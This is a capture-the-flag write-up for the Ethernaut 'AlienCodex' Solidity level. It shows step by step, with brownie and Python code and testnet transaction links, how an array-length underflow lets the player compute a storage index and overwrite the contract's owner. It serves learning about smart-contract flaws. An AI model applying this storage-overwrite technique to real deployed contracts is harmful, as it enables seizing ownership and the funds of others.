# AlienCodex

## Objectives

Claim ownership to complete the level.

## Solution

In the AlienCodex contract we can leverage the `retract()` function to cause an integer underflow in the length of the `codex` array. This underflow allows us to modify any state variable in the contract through the `revise()` function. The exploit can be performed as follows:

1. Call the `make_contact()` function to pass the `contacted()` modifier check, requiring `contact` to be true.

2. Call the `retract()` function to cause an integer overflow in the `codex` array length

3. Find the hash of the `owner` state variable as if it were part of the `codex` array by:

* Obtaining the hash of the first item in the `codex` array (as it is indexed in the contract storage), corresponding to its slot in the contract storage. This can be obtained by computing the Keccak256 hash of first _position_, so: `keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)`. 

* Taking the hash resulting from this (`0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`) and subtracting its integer value from the maximum amount of slots in a contract plus one ($2^{256} - 1$), so roughly:

$$2^{256} - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)$$

In Python (for example):

```python
2**256 -  int(web3.sha3(hexstr=f'0x{"0"*63}1').hex(),16)
```

Which returns the hash: `0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a`

4. Using this resulting value in `revise()` as the `i` (index) of the array `codex` to modify and `_content` as our address.


## How I did it

_Exactly_ as described in [solution](#solution), but using my local setup in brownie:

1. Call `make_contact()`

```python
aliencodex.make_contact(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x74e8128a14d8864febad45c3af8eeb42f8da329fb5a991a6ce863343ed31a581

2. Call `retract()` 

```python
aliencodex.retract(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x2affc0a88a1ec555330db5735d68e7819159a18aa905d5fb93698aa9eaa05dd1

3. Obtain the `codex` hash with the position of the `_owner` state variable in storage

```python
position_one = encode_abi(['uint256'],[1]).hex()
owner_hash = hex(2**256 - int(web3.sha3(hexstr=f"0x{position_one}").hex(),16))
```

4. Call `revise()` passing in my address and the hash

```python
aliencodex.revise(owner_hash, acc.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x12237e71e4fe8c6dcb94a3b3dea913d30fc8c99cc96faa890bb5bb3e1bdcb7da

5. Confirm that my address is indeed the new owner

```python
owner_assertion = aliencodex.owner() == acc.address
print(f"Address {acc.address} is the owner of the contract: {owner_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x5aeb0a8299d1b6000a56b6952b15f88f9571781402a839b483cab48f37749998
